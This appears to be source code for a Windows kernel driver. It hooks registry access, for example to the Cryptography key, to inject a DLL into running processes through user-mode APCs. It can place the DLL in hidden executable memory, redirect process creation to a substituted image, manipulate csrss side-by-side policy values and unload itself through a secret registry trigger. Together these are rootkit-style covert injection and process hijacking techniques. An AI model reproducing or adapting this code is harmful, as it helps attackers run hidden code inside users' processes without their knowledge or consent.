#include <Ntifs.h>
#include <ntddk.h>
#include <wdm.h>

#include <intrin.h>

#include "log.h"
#include "MpqHash.h"

#include "config.h"
#include "constexpr.h"
#include "macro.h"

#include "CmRegistryFilter.h"

#include "GlobalEnvironment.h"

#include "UndocumentedApi.h"
#include "DllInject.h"

#include "MpqHashHelper.h"

extern PGLOBAL_ENVIRONMENT _Global;
extern VOID ClearMapPoolPagesInUserSpace(PVOID* UpdateConfig, PMDL* UpdateMdl, PVOID* UpdateMmPages);
extern VOID SetGlobalUpdateConfig(PGLOBAL_ENVIRONMENT Global);
extern PVOID MapPoolPagesInUserSpace(PVOID* UpdateConfig, ULONG Size, PMDL* UpdateMdl);
extern VOID InitializeInjectSectionObject(PGLOBAL_ENVIRONMENT Env);

BOOLEAN DrvDelegateRoutine(ULONG_PTR Delegate, PVOID Ctx, ULONGLONG ProcessHash, ULONGLONG KeyHash);

#pragma warning(push)
#pragma warning(disable: 4307)
const ULONGLONG DllInjectKeyHash() {
  ConstexprHashOABS(InjectKeyHash, "\\Registry\\Machine\\Software\\Microsoft\\Cryptography");
  return InjectKeyHashULL;
}
#pragma warning(pop)

#pragma region APC Type1

VOID NTAPI RundownClearType1_2(__in struct _KAPC *Apc) {
  ASSERT(_Global->DelegateStatus == DELEGATE_STATUS_APC_BLOCK1);
  ZwUnmapViewOfSection(NtCurrentProcess(), Apc->Reserved[2]);
  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, &Apc->SystemArgument2);

  ExFreePool(Apc);
  _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
  //_Global->UpdateConfigTimer.QuadPart = 0;
  Log("inject dll in rundown type1 2!");
}

VOID UpdateConfig() {
  PCONFIG_TABLE ConfigTable = (PCONFIG_TABLE)_Global->UpdateConfig;

  ULONG Size = DeserialzeConfig(ConfigTable, _Global->ServiceKeyName.Length ? FALSE : TRUE);
  if (MinimumConfigSize() < Size && Size <= UPDATE_CONFIG_MAX_SIZE && _Global->ServiceKeyName.Length) {
    if (MinimumConfigSize() <= Size && !IsSameConfig(ConfigTable, _Global->Config)) {
      RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, _Global->ServiceKeyName.Buffer, STORE_VALUE_NAME, REG_BINARY, ConfigTable, Size);
    }
    Size = DeserialzeConfig(ConfigTable, TRUE);
  }

  Log("DeserialzeConfig %p, Size %d", ConfigTable, Size);
  if (MinimumConfigSize() < Size && Size <= UPDATE_CONFIG_MAX_SIZE) {
    PCM_REGISTRY_FILTER_CONTEXT Filter = (PCM_REGISTRY_FILTER_CONTEXT)InterlockedCompareExchangePointer(
      (volatile PVOID*)&_Global->Filter, nullptr, _Global->Filter);
    if (Filter) {
      NTSTATUS st = InitializeRegistryFilter(_Global->DrvObj, _Global->Altitude,
        &_Global->StackStretchList, ConfigTable, _Global->Table, DrvDelegateRoutine, &_Global->Filter);
      if (NT_SUCCESS(st)) {
        UninitializeRegistryFilter(Filter);
        _Global->UpdateConfig = InterlockedExchangePointer((PVOID*)&_Global->Config, ConfigTable);

        SetGlobalUpdateConfig(_Global);
      } else {
        ASSERT(_Global->Filter == nullptr);
        InterlockedCompareExchangePointer((volatile PVOID*)&_Global->Filter, Filter, nullptr);
        Size = 0;
      }
    }
  } else if (_Global->Config) {
    PCM_REGISTRY_FILTER_CONTEXT Filter = (PCM_REGISTRY_FILTER_CONTEXT)InterlockedCompareExchangePointer(
      (volatile PVOID*)&_Global->Filter, nullptr, _Global->Filter);
    if (Filter) {
      NTSTATUS st = InitializeRegistryFilter(_Global->DrvObj, _Global->Altitude,
        &_Global->StackStretchList, _Global->Config,
        _Global->Table, DrvDelegateRoutine, &_Global->Filter);
      if (NT_SUCCESS(st)) {
        UninitializeRegistryFilter(Filter);
        SetGlobalUpdateConfig(_Global);
      } else {
        ASSERT(_Global->Filter == nullptr);
        InterlockedCompareExchangePointer((volatile PVOID*)&_Global->Filter, Filter, nullptr);
        Size = 0;
      }
      Log("Update Config Error!");
    }
  }
  KeQuerySystemTime(&_Global->Timer);

  if (Size < MinimumConfigSize()) {
    _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
  } else {
    if (_Global->UpdateConfigSuccess++ == 0) {
      _Global->Timer.QuadPart -=
        _Global->UpdateConfigCycle - _Global->UpdateConfigFirstDealy;
    }
  }
}

VOID NTAPI ClearDllInjectType1_2(__in struct _KAPC *Apc,
  __deref_inout_opt PKNORMAL_ROUTINE *,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *UpdateMmPages
) {
  Log("inject dll type1 2!");
  _Global->DelegateStatus = DELEGATE_STATUS_APC_BLOCK2;

  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, UpdateMmPages);

  UpdateConfig();

  ExFreePool(Apc);
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
  //_Global->UpdateConfigTimer.QuadPart = 0;
  Log("inject dll type1 3!");
}

VOID NTAPI RundownClearType1_1(__in struct _KAPC *Apc) {
  ASSERT(_Global->DelegateStatus == DELEGATE_STATUS_IN_DELEGATE);

  ZwUnmapViewOfSection(NtCurrentProcess(), Apc->Reserved[2]);
  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, &Apc->SystemArgument1);

  ExFreePool(Apc);
  _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;

  Log("inject dll in rundown type1 1!");
}

VOID NTAPI ClearDllInjectType1_1(__in struct _KAPC *Apc,
  __deref_inout_opt PKNORMAL_ROUTINE *NormalRoutine,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *UpdateMmPages,
  __deref_inout_opt PVOID *
) {
  _Global->DelegateStatus = DELEGATE_STATUS_APC_BLOCK1;

  KeInitializeApc(Apc, PsGetCurrentThread(), OriginalApcEnvironment,
    ClearDllInjectType1_2, RundownClearType1_2, *NormalRoutine, UserMode, USER_CALLBACK_ROUTINE_UNMAP);

  if (!KeInsertQueueApc(Apc, nullptr, *UpdateMmPages, IO_NO_INCREMENT)) {
    ASSERT(0);
    Log("KeInsertQueueApc Error!");
    ZwUnmapViewOfSection(NtCurrentProcess(), *NormalRoutine);
    *NormalRoutine = nullptr;
    ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, UpdateMmPages);

    ExFreePool(Apc);
    _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
    _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
    //_Global->UpdateConfigTimer.QuadPart = 0;
  }
  Log("inject dll type1 1!");

#ifdef DBG
  int test = 0;
  if (test) {
    ZwUnmapViewOfSection(NtCurrentProcess(), *NormalRoutine);
  }

  test = 0;
  if (test) {
    auto a1 = _Global->UpdateMdl;
    auto a2 = *UpdateMmPages;
    ClearMapPoolPagesInUserSpace(nullptr, (PMDL*)&a1, &a2);
    _Global->UpdateMdl = nullptr;
  }

  test = 0;
  if (test) {
    UNICODE_STRING regpath = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\asdrv");
    ZwUnloadDriver(&regpath);
  }
#endif // DBG
}
#pragma endregion APC Type1

#pragma region APC Type0
VOID NTAPI RundownClearType0_2(__in struct _KAPC *Apc) {
  ASSERT(_Global->DelegateStatus == DELEGATE_STATUS_APC_BLOCK1);

  SIZE_T Size = 0;
  ZwFreeVirtualMemory(NtCurrentProcess(), &_Global->CurrentInjectDllBase, &Size, MEM_RELEASE);
  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, &Apc->SystemArgument2);

  ExFreePool(Apc);
  _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
  //_Global->UpdateConfigTimer.QuadPart = 0;
  Log("inject dll in rundown type0 2!");
}

VOID NTAPI ClearDllInjectType0_2(__in struct _KAPC *Apc,
  __deref_inout_opt PKNORMAL_ROUTINE *,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *UpdateMmPages
) {
  Log("inject dll type0 2!");
  _Global->DelegateStatus = DELEGATE_STATUS_APC_BLOCK2;

  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, UpdateMmPages);

  UpdateConfig();
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;

  ExFreePool(Apc);
  Log("inject dll type0 3!");
}

VOID NTAPI RundownClearType0_1(__in struct _KAPC *Apc) {
  ASSERT(_Global->DelegateStatus == DELEGATE_STATUS_IN_DELEGATE);

  SIZE_T Size = 0;
  ZwFreeVirtualMemory(NtCurrentProcess(), &_Global->CurrentInjectDllBase, &Size, MEM_RELEASE);
  ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, &Apc->SystemArgument1);

  ExFreePool(Apc);
  _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
  _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;

  Log("inject dll in rundown type0 1!");
}

VOID NTAPI ClearDllInjectType0_1(__in struct _KAPC *Apc,
  __deref_inout_opt PKNORMAL_ROUTINE *NormalRoutine,
  __deref_inout_opt PVOID *,
  __deref_inout_opt PVOID *UpdateMmPages,
  __deref_inout_opt PVOID *
) {
  _Global->DelegateStatus = DELEGATE_STATUS_APC_BLOCK1;

  KeInitializeApc(Apc, PsGetCurrentThread(), OriginalApcEnvironment,
    ClearDllInjectType0_2, RundownClearType0_2, *NormalRoutine, UserMode, USER_CALLBACK_ROUTINE_FREE);

  if (!KeInsertQueueApc(Apc, nullptr, *UpdateMmPages, IO_NO_INCREMENT)) {
    ASSERT(0);
    Log("KeInsertQueueApc Error!");
    *NormalRoutine = nullptr;

    SIZE_T Size = 0;
    ZwFreeVirtualMemory(NtCurrentProcess(), &_Global->CurrentInjectDllBase, &Size, MEM_RELEASE);

    ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, UpdateMmPages);

    ExFreePool(Apc);
    _Global->Timer.QuadPart -= (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
    _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
    //_Global->UpdateConfigTimer.QuadPart = 0;
  }
  Log("inject dll type0 1!");
}

VOID DllInject() {
#ifdef DBG
#define CL(n) clean = n
#else
#define CL(n) 0;
#endif // DBG
  int clean = 1;
  PVOID UpdateMmPages = nullptr;
  PVOID Base = nullptr;
  int type = -1;
  int index = 0;

  __try {
    if (!_Global->DriverFilePath.Length)
      __leave;

    Log("inject dll start!");
    ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, nullptr);
    CL(2);

    UpdateMmPages = MapPoolPagesInUserSpace(&_Global->UpdateConfig, UPDATE_CONFIG_MAX_SIZE, &_Global->UpdateMdl);
    if (!UpdateMmPages) __leave;
    RtlZeroMemory(_Global->UpdateConfig, UPDATE_CONFIG_MAX_SIZE);
    CL(3);
    Log("call user apc routine");
    {
#ifdef _M_X64
      BOOLEAN IsWow64Process = PsGetProcessWow64Process(PsGetCurrentProcess()) != nullptr;
      index += !IsWow64Process;
#endif // _M_X64
      if ((_Global->DrvFlags & DRV_FLAGS_HIDE_MAPFILE2) && _Global->InjectDllMemory[index]) {
        type = 0;
        CL(4);
        _Global->CurrentInjectMemorySize = _Global->InjectDllMemorySize[index];
        ZwAllocateVirtualMemory(NtCurrentProcess(), &Base, 0, &_Global->CurrentInjectMemorySize,
          MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        CL(5);
        if (Base) {
          _Global->CurrentInjectDllBase = Base;
          RtlCopyMemory(Base, _Global->InjectDllMemory[index], _Global->InjectDllMemorySize[index]);
        }
      } else if (_Global->InjectFileHandle[index]) {
        type = 1;
        HANDLE SectionHandle = CreateInjectDllHandle(_Global->InjectFileHandle[index]);
        CL(4);
        Base = MapInjectDll(ZwCurrentProcess(), SectionHandle);
        CL(5);
        if (SectionHandle) ZwClose(SectionHandle);
      }
      if (!Base) __leave;
      CL(6);
    }
    ASSERT(type == 0 || type == 1);

    BOOLEAN bl = FALSE;
    if (type == 1) { // MAP FILE
      bl = CallUserApcRoutine(Base, ClearDllInjectType1_1, RundownClearType1_1,
        USER_CALLBACK_ROUTINE_CONFIG, UpdateMmPages, (PVOID)UPDATE_CONFIG_MAX_SIZE);
    } else if (type == 0) { // MAP MEMORY
      bl = CallUserApcRoutine(Base, ClearDllInjectType0_1, RundownClearType0_1,
        USER_CALLBACK_ROUTINE_CONFIG, UpdateMmPages, (PVOID)UPDATE_CONFIG_MAX_SIZE);
    }

    if (!bl) __leave;
    //KeQuerySystemTime(&_Global->UpdateConfigTimer);
    Log("inject dll success!");
    clean = 0;
  } __except(Log("GetExceptionInformation %p", GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
    Log("Base %p, UpdateMmPages %p, %d", Base, UpdateMmPages, clean);
    ASSERT(0);
  }

  if (clean) {
#ifdef DBG
    WCHAR FullName[320];
    ULONG Size;

    NTSTATUS st = ZwQueryInformationProcess(ZwCurrentProcess(), ProcessImageFileNameWin32, FullName, sizeof(FullName), &Size);
    if (NT_SUCCESS(st)) {
      Log("current process %wZ", FullName);
    }
#endif // DBG
    Log("inject dll clean! %d", clean);
    if (Base && type == 1) {
      ZwUnmapViewOfSection(NtCurrentProcess(), Base);
    } else if (Base && type == 0) { // MAP MEMORY
      SIZE_T MemorySize = 0;
      ZwFreeVirtualMemory(NtCurrentProcess(), &Base, &MemorySize, MEM_RELEASE);
    }
    ClearMapPoolPagesInUserSpace(nullptr, &_Global->UpdateMdl, &UpdateMmPages);
    _Global->DelegateStatus = DELEGATE_STATUS_WAIT_TIMER;
  }
}

#pragma endregion APC Type0

VOID ForceDllInject() {
  DllInject();
}


typedef BOOLEAN (*IsRedirectNtCreateUserProcessCallback)(PCUNICODE_STRING TargetProcessFullPath, ULONGLONG ParentProcessHash);

BOOLEAN RedirectNtCreateUserProcess(
  IsRedirectNtCreateUserProcessCallback Callback,
  ULONGLONG ParentProcessHash,
  PVOID* FinalTargetSectionObject,
  HANDLE ImageFileHandle
#ifdef _M_X64
  , HANDLE ImageFileHandle64
#endif // _M_X64
);

typedef enum _DELEGATE_ROUTINE_CONSTANT {
  PassAll = 0,
} DELEGATE_ROUTINE_CONSTANT;

#pragma warning(push)
#pragma warning(disable: 4307)
ULONGLONG GetDelegateRoutineHashConstant(DELEGATE_ROUTINE_CONSTANT n) {
  if (n == PassAll) {
    ConstexprHashOABS(r, "*all pass*");
    return rULL;
  }
  return MPQ_INVALID_HASH;
}

ULONGLONG GetSxsSideBySideHashConstant() {
  ConstexprHashOABS(r, R"(\Registry\Machine\Software\Microsoft\Windows\CurrentVersion\SideBySide)");
  return rULL;
}

ULONGLONG GetSxsPolicyChangeTimeHashConstant() {
  ConstexprHashOABS(r, R"(PublisherPolicyChangeTime)");
  return rULL;
}

#pragma warning(pop)

PVOID SxsPublisherPolicyChangeTimeValue = nullptr;

BOOLEAN IsRedirectNtCreateUserProcess(PCUNICODE_STRING TargetProcessFullPath, ULONGLONG ParentProcessHash) {
  Log("%wZ", TargetProcessFullPath);
  UNICODE_STRING TargetProcessFullPathDos = *TargetProcessFullPath;
  constexpr ULONGLONG PrefixValue = 0x005c003f003f005cULL;//L"\\??\\";
  if (TargetProcessFullPathDos.Length >= 8 && TargetProcessFullPathDos.Buffer
    && *(PULONGLONG)TargetProcessFullPathDos.Buffer == PrefixValue) {
    TargetProcessFullPathDos.Length -= 8;
    TargetProcessFullPathDos.MaximumLength -= 8;
    TargetProcessFullPathDos.Buffer += 4;
  } else if(TargetProcessFullPathDos.Length >= 2 && TargetProcessFullPathDos.Buffer
    && TargetProcessFullPathDos.Buffer[0] == L'\\') {
    return FALSE;
  }

  auto H = Hash(&TargetProcessFullPathDos, _Global->Table);
  // fork pass
  if (H == MPQ_INVALID_HASH || H == ParentProcessHash) return FALSE;

  auto Item = GetConfigItem(_Global->Config, H);
  if (!Item) {
    Item = GetConfigItem(_Global->Config, GetDelegateRoutineHashConstant(PassAll));
  }
  if (!Item) return FALSE;
  ULONG Size = 0;
  auto Value = (PULONGLONG)GetConfigItemEntry(Item, ParentProcessHash, &Size);
  if (!Value) {
    Value = (PULONGLONG)GetConfigItemEntry(Item, GetDelegateRoutineHashConstant(PassAll), &Size);
  }
  if (!Value) return FALSE;
  ASSERT(Size == sizeof(ULONGLONG));
  BOOLEAN bl = !!((*Value) & 65535);
  if (bl) (*Value) -= 1;
  Log("Redirect Process %wZ, %d", TargetProcessFullPath, bl);
  return bl;
}

VOID UnloadSelfCallBack(IN PVOID, IN PVOID, IN PVOID Result);

PVOID* GetProcessBaseSectionObject(PEPROCESS Process);

BOOLEAN DrvDelegateRoutine(ULONG_PTR Delegate, PVOID Ctx, ULONGLONG ProcessHash, ULONGLONG KeyHash) {
  auto Mode = ExGetPreviousMode();
  const CONFIG_ITEM* item = (const CONFIG_ITEM*)Ctx;

  // Redirect Process part2
  if (Delegate == DRV_DELEGATE_SXS_TIME_VALUE) {
    if (!item && Mode == UserMode && SxsPublisherPolicyChangeTimeValue) {
      PVOID* SectionObjectPointer = GetProcessBaseSectionObject(IoGetCurrentProcess());
      if (SectionObjectPointer && *SectionObjectPointer == SxsPublisherPolicyChangeTimeValue) {
        ASSERT(SxsPublisherPolicyChangeTimeValue);
        SxsPublisherPolicyChangeTimeValue = 0;
        Log("Change SxsPublisherPolicyChangeTimeValue");
        return TRUE;
      }
    }
    return FALSE;
  } else if (Delegate == DRV_DELEGATE_CAPTURE_CSRSS1) {
    if (!_Global->CsrssExeFullPathHash || Mode != UserMode || (ULONGLONG)SxsPublisherPolicyChangeTimeValue == 0)
      return FALSE;
    return TRUE;
  } if (Delegate == DRV_DELEGATE_CAPTURE_CSRSS2) {
    PULONGLONG Value = (PULONGLONG)Ctx;
    if (!_Global->CsrssExeFullPathHash || Mode != UserMode || ProcessHash != _Global->CsrssExeFullPathHash ||
      KeyHash != GetSxsSideBySideHashConstant()
      || *Value != GetSxsPolicyChangeTimeHashConstant()) return FALSE;
    Log("SxsPublisherPolicyChangeTimeValue Value %p", SxsPublisherPolicyChangeTimeValue);
    *Value = (ULONGLONG)SxsPublisherPolicyChangeTimeValue;
    return TRUE;
  } else if (Mode == UserMode && KeyHash == _Global->DrvSetUnloadKeyHash) {
    NTSTATUS st;
    UnloadSelfCallBack(nullptr, nullptr, &st);
    Log("Callback %08x", st);
    return TRUE;
  // Redirect Process part1
  } else if (item && Mode == KernelMode && _Global->CsrssExeFullPathHash) {
    // Log("%p", item);
    ULONG Size;
    auto Cfg = GetConfigItemEntry(item, ProcessHash, &Size);
    if (!Cfg) {
      Cfg = GetConfigItemEntry(item, GetDelegateRoutineHashConstant(PassAll), &Size);
    }
    if (!Cfg || Size < 8) {
      return TRUE;
    }

    ULONGLONG Value = *(PULONGLONG)Cfg & (65536 - 1);
    LARGE_INTEGER Time;
    KeQuerySystemTime(&Time);
    Time.QuadPart %= 65536;

    PVOID FinalTargetSectionObject = nullptr;
    if (65535ULL - Value < (ULONGLONG)Time.QuadPart) {
      if (RedirectNtCreateUserProcess(
        IsRedirectNtCreateUserProcess,
        ProcessHash,
        &FinalTargetSectionObject,
        _Global->InjectFileHandle[0]
#ifdef _M_X64
        , _Global->InjectFileHandle[1]
#endif // _M_X64
        )) {
        Log("Redirect Process!");
        // *(PULONGLONG)Cfg &= ~(65536 - 1);
        SxsPublisherPolicyChangeTimeValue = FinalTargetSectionObject;
      }
    }
    return TRUE;
  }

  if (DELEGATE_STATUS_WAIT_TIMER !=
    InterlockedCompareExchange(&_Global->DelegateStatus, DELEGATE_STATUS_IN_DELEGATE,
      DELEGATE_STATUS_WAIT_TIMER)) {
    return TRUE;
  }

  LARGE_INTEGER Time;
  KeQuerySystemTime(&Time);

#ifdef DBG
#define SET_DELEGATE_STATUS() need_goto_else_end = FALSE
#define CHECK_DELEGATE_STATUS() ASSERT(need_goto_else_end == FALSE);
  BOOLEAN need_goto_else_end = TRUE;
#else
#define SET_DELEGATE_STATUS()
#define CHECK_DELEGATE_STATUS()
#endif // DBG
  if (Mode == UserMode && KeyHash == _Global->UpdateConfigForceKeyHash) {
    ForceDllInject();
    SET_DELEGATE_STATUS();
  } else if (Mode == UserMode && KeyHash == DllInjectKeyHash()
    && Time.QuadPart - _Global->Timer.QuadPart >= _Global->UpdateConfigCycle) {
    _Global->Timer.QuadPart = Time.QuadPart - (_Global->UpdateConfigCycle - _Global->UpdateConfigFaileDealy);
    DllInject();
    SET_DELEGATE_STATUS();
  } else {
    InterlockedCompareExchange(&_Global->DelegateStatus, DELEGATE_STATUS_WAIT_TIMER,
      DELEGATE_STATUS_IN_DELEGATE);
    SET_DELEGATE_STATUS();
  }

  CHECK_DELEGATE_STATUS();

  return TRUE;
}